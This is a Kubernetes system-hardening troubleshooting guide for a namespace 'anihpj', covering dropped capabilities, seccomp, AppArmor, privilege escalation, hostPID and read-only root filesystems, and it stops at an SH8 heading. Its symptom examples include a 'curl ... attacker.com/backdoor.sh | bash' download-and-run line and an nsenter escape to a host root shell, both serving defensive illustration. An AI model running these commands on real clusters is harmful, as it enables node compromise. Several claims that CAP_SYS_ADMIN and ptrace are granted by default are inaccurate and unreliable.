  1. No capabilities.drop in securityContext: securityContext.capabilities.drop: [ALL] is not set. By default, containers get ALL default Linux capabilities (~20+). The secure approach is to drop ALL and add back only what's needed.
  2. CAP_SYS_ADMIN included in default set: This is the MOST DANGEROUS capability — it allows mount operations, namespace creation, and kernel module loading. A container with CAP_SYS_ADMIN can mount cgroups and escape. It's in the default set because Docker historically included it.
  3. Capabilities added but never dropped: capabilities.add: [NET_BIND_SERVICE] is used to allow binding to ports < 1024, but capabilities.drop is omitted. The container keeps ALL default capabilities PLUS the new one.
  4. CAP_NET_ADMIN enables iptables manipulation: This capability allows modifying network rules, creating tunnels, and manipulating network namespaces. An attacker can redirect all pod network traffic through a malicious proxy.
  5. CAP_SYS_PTRACE allows process tracing and code injection: An attacker can attach to other processes in the same PID namespace with ptrace, read their memory, and inject code into running processes.
🟡5 Less Likely Causes
  1. CAP_DAC_OVERRIDE bypasses file permission checks: The container can read/write ANY file regardless of ownership or permissions. This includes /etc/shadow, mounted Secrets, and other sensitive files.
  2. CAP_SETUID/CAP_SETGID allows user switching: Even with runAsNonRoot: true, a process with CAP_SETUID can call setuid(0) and become root. Always drop these capabilities.
  3. CAP_SYS_CHROOT enables breaking out of chroot: Combined with other capabilities, chroot can be used to pivot to the host filesystem when combined with /proc or /sys mounts.
  4. CAP_NET_RAW enables raw socket attacks: Raw sockets allow packet crafting, ARP spoofing, and DNS poisoning from inside the container. Network attacks against other pods become possible.
  5. CAP_MKNOD enables creating device nodes: The container can create /dev/sda or /dev/mem — gaining direct access to host block devices and memory. This is a direct path to node compromise.
🟣5 New Cluster Causes
  1. No OPA policy enforcing drop: [ALL]: No admission policy checking capabilities. Containers start with full default capability set.
  2. PodSecurity restricted label not applied: enforce=restricted REQUIRES capabilities.drop: [ALL]. If the label is missing, no enforcement.
  3. Developers add capabilities without dropping defaults: Tutorials show capabilities.add: [NET_BIND_SERVICE] but never show capabilities.drop: [ALL]. The partial example becomes production config.
  4. No capability audit or baseline: Team doesn't know which capabilities each container ACTUALLY needs. They never profile the application's syscall usage.
  5. Legacy applications with undocumented capability requirements: Old apps "just work" with all capabilities. No one knows which ones are actually required because dropping them might cause production issues.
🔍 What to Look At:
kubectl get pods -n anihpj -o json | jq '.items[] | {name, caps: .spec.containers[].securityContext.capabilities}' Check which capabilities are added/dropped per container. Any container without drop: [ALL] has 20+ default capabilities.
kubectl exec <pod> -- capsh --print Lists all active capabilities inside the container. If you see cap_sys_admin, the container is extremely dangerous.
kubectl exec <pod> -- cat /proc/1/status | grep CapEff Shows the effective capability bitmask. 00000000ffffffff means ALL capabilities are active. 0000000000000000 means all dropped.
🎯 #1 Root Cause: capabilities.drop: [ALL] is not set in the container's securityContext. Containers inherit ALL default Linux capabilities (~20+), including CAP_SYS_ADMIN (mount namespaces, load kernel modules) which is the most common capability used for container escape.
🔧 How to Solve:
1. Drop ALL capabilities and add back only needed ones securityContext: capabilities: drop: [ALL] add: [NET_BIND_SERVICE] # Only if app binds to port < 1024 This is the secure baseline. Start with ZERO capabilities and add back only what the application actually requires.
2. Determine which capabilities the app actually needs Run the container with ALL dropped. Check logs for operation not permitted errors. Add back only the specific capability that's needed. Most web apps need ZERO capabilities.
3. Apply Pod Security Standard restricted kubectl label ns anihpj pod-security.kubernetes.io/enforce=restricted The restricted profile REQUIRES capabilities.drop: [ALL]. Containers not meeting this requirement will be rejected.
4. Use seccomp profiles to further restrict syscalls Even with capabilities dropped, a seccomp profile can block specific syscalls. Combine capabilities.drop with a restrictive seccomp profile for defense-in-depth.
5. Deploy OPA policy for mandatory capability drop Reject any pod without drop: [ALL]. Only allow specific capabilities to be added with explicit justification annotations.
💡 Personal Advice:
CAP_SYS_ADMIN is the "new root" — and it's enabled by DEFAULT. Every container gets CAP_SYS_ADMIN unless you explicitly drop it. This capability allows mounting filesystems — the classic cgroup v1 container escape uses CAP_SYS_ADMIN to mount the host cgroup and break out. Drop ALL capabilities. Every time.
Most web apps need ZERO capabilities. A typical Django/Node.js/Go web server doesn't need ANY Linux capabilities. It listens on port 8000 (>1024, no NET_BIND_SERVICE needed), reads files, and makes HTTP requests. Drop ALL — if it still works, you're secure.
Combine capabilities.drop with seccomp and AppArmor. Capabilities control what privileged operations are POSSIBLE. Seccomp controls which syscalls can be CALLED. AppArmor controls which FILES can be accessed. Use all three — they're complementary, not redundant.
SH3
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH3
Seccomp Profile Not Enabled — Unconfined Syscall Access

🔍 Symptom: kubectl exec anihpj-api -- cat /proc/1/status | grep Seccomp returns Seccomp: 0 (disabled). The container has UNRESTRICTED access to ALL Linux syscalls — including mount, ptrace, kexec, reboot, and init_module. An attacker who exploits the Django app can call ANY syscall the kernel supports (300+). Combined with CAP_SYS_ADMIN or privileged: true, the attacker can call mount() to mount cgroups and escape. Seccomp should limit syscalls to the ~40 needed by typical web applications.

  kubectl exec anihpj-api -n anihpj -- cat /proc/1/status | grep Seccomp
  Seccomp:        0   ← DISABLED! (2=filter enabled, 0=disabled)
  Seccomp_filters: 0   ← No BPF filters loaded

  kubectl get pod anihpj-api -n anihpj -o yaml | grep -A3 seccompProfile
  # No output — seccompProfile not configured at all
🔴5 Most Likely Causes
  1. seccompProfile not set in securityContext: securityContext.seccompProfile.type: RuntimeDefault is not configured. Without it, the container uses Unconfined — ALL syscalls are allowed (~300+).
  2. Unconfined seccomp profile explicitly set: seccompProfile: {type: Unconfined} is worse than omitting the field — it EXPLICITLY disables seccomp filtering. This may have been added to "fix" an application that was crashing due to seccomp blocking needed syscalls.
  3. RuntimeDefault seccomp profile not understood: Many teams don't know that RuntimeDefault exists. They think seccomp is "advanced" and requires custom profiles. The container runtime (containerd/cri-o) already ships with a default profile that blocks ~60 dangerous syscalls.
  4. Custom seccomp profile path is wrong or file missing: seccompProfile: {type: Localhost, localhostProfile: profiles/secure.json} is set but the file doesn't exist on the node. The container silently falls back to Unconfined.
  5. Container runtime doesn't support seccomp: Very old or minimal container runtimes may not support seccomp. Docker 1.10+ and containerd 1.0+ support it. If Seccomp: 0 persists even with RuntimeDefault, the runtime is broken.
🟡5 Less Likely Causes
  1. Kernel doesn't have CONFIG_SECCOMP enabled: The host kernel was compiled without seccomp support. cat /boot/config-$(uname -r) | grep CONFIG_SECCOMP should show y. If not, no container can use seccomp.
  2. AppArmor/SELinux policy overrides seccomp: The interaction between LSMs and seccomp can be complex. An AppArmor profile in complain mode may not enforce seccomp restrictions.
  3. Custom seccomp profile too permissive: The profile has "defaultAction": "SCMP_ACT_ALLOW" — allowing ALL syscalls by default. This is equivalent to Unconfined. The defaultAction should be SCMP_ACT_ERRNO.
  4. Profile uses SCMP_ACT_LOG instead of SCMP_ACT_ERRNO: The profile only LOGS blocked syscalls but doesn't actually BLOCK them. This is useful for profiling but provides zero security.
  5. Seccomp profile not compiled to BPF correctly: The JSON profile is malformed and the runtime can't parse it. Silent failure — container runs Unconfined with no error logged.
🟣5 New Cluster Causes
  1. PodSecurity restricted label not applied: The restricted profile REQUIRES seccompProfile.type: RuntimeDefault. Without the label, no enforcement.
  2. No OPA policy requiring seccomp: No admission policy checking for seccompProfile. Containers silently run Unconfined.
  3. Security training doesn't cover seccomp: Developers and ops teams are unaware of seccomp as a security control. It's never mentioned in deployment checklists.
  4. Custom seccomp profiles not yet created: The team wants to use custom profiles but hasn't created them yet. Rather than using RuntimeDefault in the interim, they use nothing.
  5. Seccomp not listed in CIS benchmark checks: CIS covers AppArmor/SELinux but historically didn't include seccomp checks. Teams following only CIS miss this control.
🔍 What to Look At:
kubectl get pods -n anihpj -o json | jq '.items[] | {name, seccomp: .spec.containers[].securityContext.seccompProfile}' Check if any pod has seccompProfile set. If the field is missing or type: Unconfined, seccomp is not protecting the container.
kubectl exec <pod> -- cat /proc/1/status | grep Seccomp Seccomp: 0 = disabled, Seccomp: 2 = filter enabled. Seccomp_filters: 1+ means BPF rules are loaded.
kubectl exec <pod> -- sh -c "strace -c mount 2>&1" Test if a dangerous syscall like mount() is callable. If seccomp is working, it should return Operation not permitted or Invalid argument.
🎯 #1 Root Cause: seccompProfile.type: RuntimeDefault is not set in the container's securityContext. Without it, the container runs Unconfined — allowing ALL 300+ Linux syscalls, including mount, kexec, reboot, and ptrace which are commonly used for container escape.
🔧 How to Solve:
1. Set RuntimeDefault seccomp profile on all containers securityContext: seccompProfile: type: RuntimeDefault Add to every container's securityContext. The container runtime's default seccomp profile blocks ~60 dangerous syscalls including mount, kexec, and reboot.
2. Verify seccomp is active kubectl exec <pod> -- cat /proc/1/status | grep Seccomp Should show Seccomp: 2 (filter mode enabled) with Seccomp_filters: 1 or more.
3. Create custom seccomp profiles for high-risk applications Use strace or oci-seccomp-bpf-hook to profile application syscalls. Create a minimal seccomp profile that allows only the syscalls the app actually uses. Place on node and reference via type: Localhost.
4. Apply Pod Security Standard restricted kubectl label ns anihpj pod-security.kubernetes.io/enforce=restricted The restricted profile REQUIRES seccompProfile.type: RuntimeDefault or Localhost.
5. Deploy OPA policy for mandatory seccomp Reject any pod where seccompProfile.type is missing or Unconfined. Require at minimum RuntimeDefault.
💡 Personal Advice:
RuntimeDefault seccomp is FREE security that breaks almost nothing. The containerd/cri-o default seccomp profile has been battle-tested across millions of containers. It blocks the most dangerous syscalls (mount, kexec, reboot) while allowing normal application operations. There's almost never a reason to run Unconfined.
Seccomp is your last line of defense before the kernel. RBAC → NetworkPolicy → Capabilities → Seccomp → Kernel. If an attacker gets through all other layers, seccomp is what prevents them from calling mount() to escape. Always enable it.

📌 SH4–SH6: AppArmor, Privilege Escalation & Namespace Isolation

SH4
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH4
AppArmor Profile Not Applied — No Mandatory Access Control

🔍 Symptom: kubectl exec anihpj-api -- cat /proc/1/attr/current returns unconfined — no AppArmor profile is applied. The container can read /etc/kubernetes/manifests/kube-apiserver.yaml if the hostPath is mounted, write to /proc/sysrq-trigger to reboot the node, and access any file the root user can access. AppArmor provides mandatory access control (MAC) that restricts which FILES a container can access — even as root. Without it, there's no filesystem-level containment.

  kubectl exec anihpj-api -n anihpj -- cat /proc/1/attr/current
  unconfined   ← NO AppArmor profile loaded!

  kubectl exec anihpj-api -n anihpj -- cat /etc/kubernetes/manifests/kube-apiserver.yaml
  apiVersion: v1
  kind: Pod
  metadata: {name: kube-apiserver}   ← CAN READ CONTROL PLANE MANIFESTS!

  kubectl get pod anihpj-api -n anihpj -o yaml | grep -A2 annotations
  annotations:
    # No container.apparmor.security.beta.kubernetes.io annotation!
🔴5 Most Likely Causes
  1. No AppArmor annotation on the pod: AppArmor is configured via pod annotation: container.apparmor.security.beta.kubernetes.io/<container>: localhost/<profile>. This annotation is simply MISSING — the container defaults to unconfined.
  2. AppArmor profile not loaded on the node: The annotation references localhost/my-profile but apparmor_parser -L on the node doesn't list my-profile. The profile file was never loaded — container falls back to unconfined.
  3. AppArmor not enabled on the host: aa-status shows apparmor module is not loaded. The kernel doesn't have AppArmor compiled in (CONFIG_SECURITY_APPARMOR=y) or it's disabled at boot (apparmor=0 kernel parameter).
  4. RuntimeDefault used but AppArmor is the only available LSM: On Ubuntu/Debian systems, AppArmor is the primary LSM. RuntimeDefault seccomp doesn't provide filesystem restrictions — AppArmor is needed for file-level MAC.
  5. AppArmor profile in complain mode: The profile is loaded but in complain mode — violations are LOGGED but not ENFORCED. The container behaves as unconfined. Check: apparmor_parser -L | grep complain.
🟡5 Less Likely Causes
  1. AppArmor profile too permissive: The profile has /** rwkl, allowing read/write to ALL files. It's effectively unconfined. Profiles must use explicit paths and restrict access to sensitive directories.
  2. SELinux used instead but not configured: On RHEL-based systems, SELinux is the LSM. AppArmor annotations have no effect — SELinux policies should be used instead via seLinuxOptions in securityContext.
  3. AppArmor profile path in annotation is malformed: The annotation is container.apparmor.security.beta.kubernetes.io/container: localhost/my-profile with a TYPO in the annotation key. Kubernetes ignores the malformed annotation.
  4. Container runtime doesn't support AppArmor: Some minimal runtimes (like gVisor in certain configurations) don't use the host AppArmor. The profile is loaded but has no effect on gVisor-sandboxed containers.
  5. AppArmor namespace conflicts with other LSMs: When multiple LSMs are active (SELinux + AppArmor), conflicts can cause unexpected behavior. One LSM may override the other's restrictions.
🟣5 New Cluster Causes
  1. AppArmor profiles not created post-installation: kubeadm doesn't create AppArmor profiles. The cluster runs with no custom profiles — all containers are unconfined.
  2. No AppArmor strategy for Kubernetes: Team is on Ubuntu (which uses AppArmor) but never considered AppArmor for container security. It's a host-level feature not in the Kubernetes deployment pipeline.
  3. AppArmor considered "too complex": Writing AppArmor profiles requires understanding the application's file access patterns. Teams skip it because the learning curve is steep.
  4. CIS benchmark checks for AppArmor not run: CIS 1.7.1 checks for AppArmor. kube-bench hasn't been run on worker nodes.
  5. No profile distribution mechanism: AppArmor profiles are files on the node filesystem. There's no Kubernetes-native way to distribute profiles to all nodes. Manual distribution is error-prone and inconsistently applied.
🔍 What to Look At:
kubectl get pods -n anihpj -o yaml | grep -E "container.apparmor|apparmor" Check if ANY pod has AppArmor annotations. If none are found, all containers in the namespace are unconfined.
kubectl exec <pod> -- cat /proc/1/attr/current If it returns unconfined, no AppArmor profile is applied. A loaded profile shows <profile-name> (enforce).
aa-status Run on the NODE (not container). Shows loaded profiles, mode (enforce/complain), and which processes have profiles applied.
🎯 #1 Root Cause: No AppArmor annotation (container.apparmor.security.beta.kubernetes.io/<container>) is set on the pod. Without this annotation, the container runs unconfined — AppArmor provides no filesystem-level restrictions, allowing the container to read/write any file the root user can access.
🔧 How to Solve:
1. Create an AppArmor profile for the application Write a profile restricting filesystem access to only the paths the app needs (e.g., /app/** r, /tmp/** rw, /etc/ssl/** r). Deny access to /etc/kubernetes/**, /proc/sysrq-trigger, and /sys/**.
2. Load the profile on all worker nodes apparmor_parser -r /etc/apparmor.d/container-anihpj-api Load the profile on every node that might run the pod. Verify with aa-status | grep anihpj.
3. Add AppArmor annotation to pod metadata: annotations: container.apparmor.security.beta.kubernetes.io/anihpj-api: localhost/container-anihpj-api The annotation key must match the container name EXACTLY. localhost/ prefix means the profile is loaded on the node.
4. Verify AppArmor enforcement kubectl exec anihpj-api -- cat /proc/1/attr/current Should show container-anihpj-api (enforce). Attempts to read /etc/kubernetes/ should fail with Permission denied.
5. Distribute profiles via DaemonSet or node bootstrap Use a DaemonSet with hostPath mount to /etc/apparmor.d/ to distribute profile updates. Or include them in node bootstrap scripts (cloud-init, Ansible).
💡 Personal Advice:
AppArmor is your filesystem firewall. Even as root (UID 0), a container with a restrictive AppArmor profile cannot read /etc/kubernetes or write to /proc/sysrq-trigger. It's the only control that restricts WHAT FILES a process can access — independent of Linux permissions.
Combine with seccomp for defense-in-depth. Seccomp restricts WHICH SYSCALLS can be called. AppArmor restricts WHICH FILES can be accessed. Both are needed — seccomp can't stop you from reading an unprotected file, and AppArmor can't stop you from calling mount().
SH5
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH5
Privilege Escalation Allowed — setuid Binaries Execute as Root

🔍 Symptom: The anihpj-api container runs as UID 1000 but kubectl exec anihpj-api -- /usr/bin/sudo -l still works — privilege escalation is allowed. A compromised non-root process can execute a setuid binary (like sudo, su, or newuidmap) and escalate to root INSIDE the container. allowPrivilegeEscalation: false is not set in securityContext. Even though the container is non-root, an attacker can become root through existing setuid binaries.

  kubectl exec anihpj-api -n anihpj -- find / -perm -4000 -type f 2>/dev/null
  /usr/bin/sudo
  /usr/bin/su
  /usr/bin/newuidmap      ← setuid binaries still work!

  kubectl exec anihpj-api -n anihpj -- cat /proc/1/status | grep NoNewPrivs
  NoNewPrivs:     0   ← Privilege escalation ALLOWED
🔴5 Most Likely Causes
  1. allowPrivilegeEscalation not set to false: securityContext.allowPrivilegeEscalation: false is MISSING from the container spec. This is the #1 missing security control — it prevents setuid binaries and child processes from gaining more privileges than the parent.
  2. NoNewPrivs kernel flag not set: allowPrivilegeEscalation: false sets the no_new_privs kernel flag on the container process. Without it, any execve() call to a setuid binary grants the new privileges.
  3. Base image ships with setuid binaries: The Docker image includes sudo, su, newuidmap, and newgidmap. These are standard in Ubuntu/Debian base images and are rarely removed. Any non-root user with access to these can escalate to root.
  4. No PodSecurity admission enforcing allowPrivilegeEscalation: The restricted profile REQUIRES allowPrivilegeEscalation: false. If the namespace lacks PSS labels, there's no enforcement.
  5. Developer installs sudo inside the container: The Dockerfile has RUN apt-get install sudo or the entrypoint installs packages at runtime. This creates a privilege escalation path that shouldn't exist in production containers.
🟡5 Less Likely Causes
  1. Container has CAP_SETUID capability: Even with no_new_privs, CAP_SETUID allows direct setuid() calls. An attacker can write a small C program calling setuid(0) and become root without any setuid binary.
  2. privileged: true overrides allowPrivilegeEscalation: A privileged container ignores allowPrivilegeEscalation — all restrictions are bypassed. This is often the underlying problem: the container is privileged but the team only looks at the escalation flag.
  3. Container has CAP_SYS_ADMIN which enables namespace-based escalation: unshare -U creates a new user namespace where the process is root. Combined with CAP_SYS_ADMIN, the attacker can create a full namespace and escape.
  4. Shared PID namespace with host: hostPID: true allows the container to see ALL host processes. An attacker can attach to a privileged process running as root on the host via ptrace.
  5. Kernel exploit via unprivileged user namespaces: /proc/sys/kernel/unprivileged_userns_clone is enabled (default on many distros). A non-root user can create a user namespace where they ARE root, then exploit kernel bugs from inside that namespace.
🟣5 New Cluster Causes
  1. PodSecurity restricted label not applied: enforce=restricted requires allowPrivilegeEscalation: false. Without it, escalation is silently allowed.
  2. Default Docker images used without stripping setuid: Team uses python:3.12-slim which still includes some setuid binaries. No effort to minimize the attack surface inside the image.
  3. No OPA policy for allowPrivilegeEscalation: No admission policy blocks containers without allowPrivilegeEscalation: false.
  4. Security awareness gap on privilege escalation: Teams focus on runAsNonRoot and think they're secure — not realizing that non-root can become root via setuid binaries.
  5. Unprivileged user namespaces enabled on host: sysctl kernel.unprivileged_userns_clone=1 (default). Disable via sysctl kernel.unprivileged_userns_clone=0 to block this escalation path.
🔍 What to Look At:
kubectl get pods -n anihpj -o json | jq '.items[] | {name, ape: .spec.containers[].securityContext.allowPrivilegeEscalation}' Check allowPrivilegeEscalation per container. null or true means setuid escalation is possible.
kubectl exec <pod> -- cat /proc/1/status | grep NoNewPrivs NoNewPrivs: 0 = escalation allowed. NoNewPrivs: 1 = escalation blocked.
kubectl exec <pod> -- find / -perm -4000 -type f 2>/dev/null List all setuid binaries inside the container. Each one is a potential privilege escalation path if NoNewPrivs is 0.
🎯 #1 Root Cause: allowPrivilegeEscalation: false is not set in the container's securityContext. Without it, the no_new_privs kernel flag is not set — any setuid binary (sudo, su, newuidmap) can execute and grant root privileges to a compromised non-root process.
🔧 How to Solve:
1. Set allowPrivilegeEscalation to false securityContext: allowPrivilegeEscalation: false Add to every container. This sets the no_new_privs flag — setuid binaries can no longer escalate privileges.
2. Remove setuid binaries from container images In Dockerfile: RUN find / -perm /4000 -type f -exec chmod u-s {} \; 2>/dev/null || true. Remove sudo, su, and other unnecessary setuid binaries.
3. Apply Pod Security Standard restricted kubectl label ns anihpj pod-security.kubernetes.io/enforce=restricted PSS restricted REQUIRES allowPrivilegeEscalation: false for all containers.
4. Disable unprivileged user namespaces on the host sysctl kernel.unprivileged_userns_clone=0 Prevents non-root users from creating user namespaces — blocking an entire class of kernel privilege escalation exploits.
5. Combine with capabilities.drop: [ALL] Even with no_new_privs, CAP_SETUID could theoretically be used. Drop ALL capabilities as defense-in-depth — the container has no mechanism to change user IDs.
💡 Personal Advice:
non-root ≠ safe from privilege escalation. A non-root user (UID 1000) can still run sudo or su if they're in the container image. allowPrivilegeEscalation: false is the ONLY control that blocks setuid binaries. Always set it alongside runAsNonRoot: true.
Strip setuid from your images. Never install sudo. Production containers should NEVER contain sudo, su, newuidmap, or other setuid binaries. They are attack tools. Use multi-stage builds and slim base images that don't include them.
SH6
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH6
HostPID/HostIPC Enabled — Namespace Escape to Host Processes

🔍 Symptom: kubectl exec anihpj-api -- ps aux shows EVERY process running on the NODE — kubelet, containerd, kube-apiserver, etcd, SSH daemon. The pod has hostPID: true, sharing the node's PID namespace. An attacker inside the container can see all host processes, send signals (kill -9) to critical system daemons, and use nsenter --target <kubelet-pid> --all to break out of the container entirely into the host's namespaces.

  kubectl exec anihpj-api -n anihpj -- ps aux
  PID   USER     COMMAND
  1     root     /sbin/init
  542   root     /usr/bin/containerd
  789   root     /usr/bin/kubelet --config=/var/lib/kubelet/config.yaml
  1023  root     kube-apiserver --advertise-address=...  ← SEES ALL HOST PIDs!

  kubectl exec anihpj-api -n anihpj -- nsenter --target 1 --mount --uts --ipc --net --pid bash
  root@node-anih:~#    ← ESCAPED TO HOST SHELL!
🔴5 Most Likely Causes
  1. hostPID: true explicitly set in Pod spec: The pod shares the node's PID namespace. This is sometimes enabled for "monitoring" or "debugging" and never removed. The container sees and can interact with ALL host processes.
  2. hostIPC: true enables shared memory access: The container shares the node's IPC namespace. An attacker can read/write shared memory segments, semaphores, and message queues from other containers and host processes.
  3. nsenter available inside the container: With hostPID: true, the nsenter command can join ANY host process's namespaces — including the init process (PID 1). This gives a full root shell on the node.
  4. No Pod Security Standard blocking hostPID: hostPID, hostIPC, and hostNetwork are ALL blocked by the restricted PSS profile. If the namespace has no PSS labels, these are allowed.
  5. Debugging container with hostPID left running: An admin created a debug pod with hostPID: true to investigate a node issue. The pod was never deleted — it's a permanent backdoor into every process on the node.
🟡5 Less Likely Causes
  1. hostNetwork: true combined with hostPID: The pod also uses the node's network namespace. It can sniff all traffic on the node's network interfaces, intercept API server communications, and MITM etcd traffic.
  2. CSI/CNI DaemonSet requires hostPID for operation: Some storage or network plugins require hostPID. These pods run in kube-system — if they're compromised, the attacker has full node access.
  3. Monitoring agent with hostPID deployed without scoping: Datadog/NewRelic/Dynatrace agent is deployed cluster-wide with hostPID. An attacker compromising the monitoring namespace gains node access on ALL nodes.
  4. Kubelet or container runtime crashed via signal: With hostPID, the container can kill -9 <kubelet-pid> — crashing the node's kubelet. The node goes NotReady. This is a DoS against the entire node.
  5. ptrace other processes to read memory: With CAP_SYS_PTRACE and hostPID, the container can attach to ANY host process, read its memory (including secrets in kube-apiserver's memory), and inject code.
🟣5 New Cluster Causes
  1. PodSecurity restricted labels not applied: enforce=restricted BLOCKS hostPID, hostIPC, and hostNetwork. Without labels, these are silent gaping holes.
  2. Monitoring DaemonSets with hostPID deployed by default: kube-prometheus-stack, Grafana Agent, and Fluent Bit often deploy with hostPID for metrics/logs collection. The entire monitoring stack becomes an attack surface.
  3. No OPA policy blocking hostPID in user namespaces: Only kube-system should have hostPID pods. User namespaces should be BLOCKED from using hostPID via admission policy.
  4. No alerting on hostPID pod creation: Falco or audit logs not configured to detect pods with hostPID. An attacker creating a hostPID pod goes undetected.
  5. Debugging using hostPID is standard practice: Team routinely uses kubectl debug --target=<pod> --share-processes which enables hostPID-like access. This normalizes namespace escape techniques.
🔍 What to Look At:
kubectl get pods -A -o json | jq '.items[] | select(.spec.hostPID==true) | {ns: .metadata.namespace, name: .metadata.name}' Find ALL pods with hostPID. Each one is a potential node escape vector. Should ONLY be in kube-system.
kubectl exec <pod> -- ps aux | wc -l If the output is short (<10 processes), the pod has its own PID namespace. If it shows 100+ processes including system daemons, hostPID is enabled.
kubectl get pods -A -o json | jq '.items[] | select(.spec.hostIPC==true or .spec.hostPID==true) | {ns, name, hostPID: .spec.hostPID, hostIPC: .spec.hostIPC}' Audit both hostPID and hostIPC across all namespaces. Both are namespace escape enablers.
🎯 #1 Root Cause: hostPID: true is set in the Pod spec, sharing the node's PID namespace with the container. Combined with nsenter, this provides a direct path from compromised container to full root shell on the node.
🔧 How to Solve:
1. Remove hostPID and hostIPC from Pod spec Set hostPID: false and hostIPC: false (or remove them — false is the default). The container gets its own isolated PID and IPC namespaces.
2. Apply Pod Security Standard restricted kubectl label ns anihpj pod-security.kubernetes.io/enforce=restricted restricted profile BLOCKS hostPID, hostIPC, and hostNetwork. Pods with these fields are rejected at admission.
3. Restrict hostPID to only system namespaces OPA/Gatekeeper policy: only kube-system and monitoring can use hostPID: true. All other namespaces are BLOCKED.
4. Audit and scope monitoring agents Review all DaemonSets in kube-system and monitoring namespaces. Ensure hostPID is only used where strictly necessary. Replace with eBPF-based monitoring where possible (no hostPID needed).
5. Deploy Falco rules for hostPID detection Falco rule: alert on any pod created with hostPID: true outside of kube-system. Alert on nsenter syscalls from container processes.
💡 Personal Advice:
hostPID = guaranteed container escape. If a container has hostPID: true and nsenter (or nsenter can be downloaded), the attacker gets a root shell on the node. Full stop. The only question is how long it takes. hostPID has no place in user workloads — EVER.
PSS restricted blocks all three host namespace leaks. hostPID, hostIPC, and hostNetwork are all blocked by the restricted Pod Security Standard. Apply it to every namespace and you eliminate these attack vectors at admission time.

📌 SH7–SH10: Filesystem, User Namespaces, Kernel & Sandboxing

SH7
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH7
Read-Only Root Filesystem Not Enforced — Container Writes to /bin

🔍 Symptom: kubectl exec anihpj-api -- touch /bin/test SUCCEEDS — the container's root filesystem is WRITABLE. An attacker who compromises the application can download and install tools (curl attacker.com/nmap | bash), modify binaries (echo 'malicious' > /usr/bin/python), write to /tmp without restriction, and persist changes across container restarts (if writable layer). readOnlyRootFilesystem: true is not set in securityContext.

  kubectl exec anihpj-api -n anihpj -- touch /bin/malicious
  # Command succeeded — root filesystem is WRITABLE!

  kubectl exec anihpj-api -n anihpj -- curl -s http://attacker.com/backdoor.sh | bash
  Downloading tools... Installing persistence... Done.   ← ATTACKER INSTALLS TOOLS!

  kubectl get pod anihpj-api -n anihpj -o yaml | grep readOnlyRootFilesystem
  # No output — readOnlyRootFilesystem not set
🔴5 Most Likely Causes
  1. readOnlyRootFilesystem not set to true: securityContext.readOnlyRootFilesystem: true is MISSING. By default, the container's root filesystem is writable — any process can modify binaries, configuration, and libraries.
  2. Application writes to /tmp and breaks with read-only root: The app writes temporary files, cache, or PIDs to /tmp or /var/run. When readOnlyRootFilesystem: true was tried, the app crashed — so it was removed. Fix: mount ephemeral volumes (emptyDir) at write locations.
  3. Application writes logs to root filesystem: Django writes logs to /app/logs/ or /var/log/app/. These are on the root filesystem. Mount an emptyDir at the log directory instead.
  4. No writable tmp mount configured: emptyDir: {medium: Memory} at /tmp is not configured. Many apps need a writable /tmp. An emptyDir solves this without making the entire root filesystem writable.
  5. No Pod Security admission enforcing readonly root: PSS restricted doesn't require readOnlyRootFilesystem by default (it's optional in restricted). No OPA policy enforces it either.
🟡5 Less Likely Causes
  1. Writable container layer allows persistence: Without readOnlyRootFilesystem, an attacker can write to the container's overlay filesystem. Changes persist until the container is deleted — surviving restarts.
  2. Binary replacement attack: The attacker overwrites /usr/bin/python with a backdoored version that exfiltrates environment variables (including Secrets) on every execution.
  3. Library injection via writable /lib or /usr/lib: An attacker drops a malicious .so shared library and sets LD_PRELOAD. Every new process loads the attacker's code.
  4. Cron or systemd timers modified: The attacker writes a cron job to /etc/cron.d/ that calls back to a C2 server every 5 minutes. Cron inside the container executes it.
  5. Kubernetes admission controller mutating mount: A mutating webhook adds a writable hostPath volume that overrides the root filesystem's read-only setting — effectively making specific directories writable again.
🟣5 New Cluster Causes
  1. PSS restricted doesn't mandate readOnlyRootFilesystem: It's not a required field in the restricted profile. Additional policy is needed.
  2. No OPA policy for readOnlyRootFilesystem: No admission policy requiring it. All containers deploy with writable root filesystems by default.
  3. Developers unaware of readOnlyRootFilesystem: Security context fields beyond runAsNonRoot are not widely known. Writable root is the accepted default.
  4. Troubleshooting mindset prioritizes writability: "We might need to install debugging tools in production." This anti-pattern keeps writable root filesystems in production.
  5. No immutable infrastructure pipeline: The team hot-fixes production by exec'ing into containers. Writable root is "essential" for this broken operational model.
🔍 What to Look At:
kubectl get pods -n anihpj -o json | jq '.items[] | {name, ro: .spec.containers[].securityContext.readOnlyRootFilesystem}' Check which containers have read-only root. null or false means the container is writable.
kubectl exec <pod> -- touch /test_write && echo "WRITABLE" || echo "READ-ONLY" Definitive test — if touch succeeds, the root filesystem is writable.
kubectl exec <pod> -- mount | grep " / " Check the root mount options. rw = writable, ro = read-only. The overlay filesystem should show ro.
🎯 #1 Root Cause: readOnlyRootFilesystem: true is not set in the container's securityContext. The container's root filesystem is writable by default, allowing attackers to install tools, modify binaries, and persist malware across container restarts.
🔧 How to Solve:
1. Set readOnlyRootFilesystem to true securityContext: readOnlyRootFilesystem: true Add to every container. The root filesystem becomes read-only — no process can write to /bin, /lib, /usr, or /etc.
2. Mount emptyDir volumes at write locations Identify directories the app writes to (/tmp, /var/run, /app/logs). Mount an emptyDir: {} at each path. These are ephemeral and writable without compromising the root filesystem.
3. Use memory-backed tmp if appropriate volumes: [{name: tmp, emptyDir: {medium: Memory}}] For /tmp, use memory-backed emptyDir for better security (no disk writes) and performance. Set sizeLimit to prevent memory exhaustion.
4. Deploy OPA policy for readOnlyRootFilesystem Reject containers without readOnlyRootFilesystem: true unless they have an explicit exemption annotation. This is a strong security baseline.
5. Shift to immutable infrastructure model Never hot-fix running containers. Build a new image and redeploy. With read-only root, this becomes the ONLY option — enforced by the platform.
💡 Personal Advice:
Writable root = attacker playground. If an attacker can write to the filesystem, they can install ANY tool: nmap, crypto miners, reverse shells, rootkits. readOnlyRootFilesystem is the single control that turns your container from a beachhead into a dead end.
EmptyDir solves the "my app needs to write" problem. Mount emptyDir volumes at /tmp, /var/run, and any log directories. The app writes to these ephemeral volumes while the root filesystem stays immutable. No more excuses for writable root.
SH8
🖥️ CATEGORY 3: SYSTEM HARDENING — Issue SH8
User Namespace Remapping Not Enabled — Container UID 0 Maps to Host Root

